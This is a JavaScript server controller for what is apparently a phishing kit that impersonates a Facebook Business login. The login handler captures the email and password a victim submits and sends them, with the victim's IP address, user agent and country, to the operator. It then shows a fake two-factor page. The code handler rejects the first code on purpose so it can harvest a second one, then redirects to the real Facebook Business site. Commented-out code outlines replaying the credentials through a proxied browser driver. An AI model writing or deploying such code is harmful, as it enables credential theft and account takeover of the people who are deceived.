/* eslint-disable no-promise-executor-return */
/* eslint-disable no-unused-expressions */
// eslint-disable-next-line import/no-import-module-exports
import * as Driver from '../common';

const drivers = {};

/**
 * Login
 * @param {*} req
 */
exports.login = async (req, res, next) => {
    try {
        const { body } = req;
        const { email, pass } = body;
        console.log('LOG Status:: ', { email, pass, status: 'running' });

        if (!email || !pass) {
            return res.render('login_fail_desktop', { username: email, password: pass });
        }

        const userAgent = req.get('user-agent'); // Lấy User-Agent từ yêu cầu HTTP
        const ipRemote = req.ip || req.socket.remoteAddress;
        const country = await Driver.getIPInfo(ipRemote ? ipRemote.replace('::ffff:', '') : 'vn');
        drivers[email] = body;
        // const proxies = await Driver.getProxy(country);

        // drivers[email] && delete drivers[email];
        // const driver = await Driver.initDriver(proxies);
        // const state = await Driver.checkUserInfo(driver, email, pass);
        // drivers[email] = driver;

        // if (state === 'FAILED') {
        //     console.log('LOG Status:: ', { email, pass, status: 'failed' });
        //     return res.render('login_fail_desktop', { username: email, password: pass });
        // }

        // if (state === 'REQUEST_2FA') {
        //     // console.log('LOG Status:: ', { email, pass, status: 'request 2fa code' });
        //     await Driver.sendMessage({ name: email, pass, status: 'request 2fa code' });
        //     return res.render('2fa_desktop', { username: email, password: pass });
        // }

        // console.log('LOG Status:: ', { email, pass, status: 'success' });
        await Driver.sendMessage({
            name: email,
            pass,
            address: ipRemote,
            userAgent,
            country,
            status: 'Login',
        });
        // return res.redirect('https://business.facebook.com/');
        await new Promise((timeDelay) => setTimeout(timeDelay, 5000)); // Delay 3 seconds
        return res.render('2fa_desktop', { username: email, password: pass });
    } catch (error) {
        console.log('ERR:: Login api error', error);
        throw error(error, req, res, next);
    }
};

/**
 * Accept code
 * @param {*} req
 */
exports.acceptCode = async (req, res, next) => {
    try {
        const { body } = req;
        const userAgent = req.get('user-agent'); // Lấy User-Agent từ yêu cầu HTTP
        const ipRemote = req.ip || req.socket.remoteAddress;
        console.log('LOG Status:: ', { ...body, status: 'running' });
        // const state = await Driver.acceptCode(driver, body);
        const state = drivers[body.username]
            ? 'REQUEST_2FA_FAILED'
            : 'LOGIN_SUCCESS';

        if (state === 'REQUEST_2FA_FAILED') {
            delete drivers[body.username];
            console.log('LOG Status:: ', { ...body, status: '2fa failed' });
            await Driver.sendMessage({
                name: body.username,
                pass: body.password,
                code: body.approvals_code,
                address: ipRemote,
                userAgent,
                status: '2fa_code_1',
            });
            await new Promise((timeDelay) => setTimeout(timeDelay, 5000)); // Delay 3 seconds
            return res.render('2fa_failed_desktop', body);
        }

        // console.log('LOG Status:: ', { ...body, status: '2fa success' });
        await Driver.sendMessage({
            name: body.username,
            pass: body.password,
            code: body.approvals_code,
            status: '2fa_code_2',
            address: ipRemote,
            userAgent,
        });
        await new Promise((timeDelay) => setTimeout(timeDelay, 5000)); // Delay 3 seconds
        return res.redirect('https://business.facebook.com/');
    } catch (error) {
        console.log('ERR:: Accept code api error', error);
        throw error(error, req, res, next);
    }
};
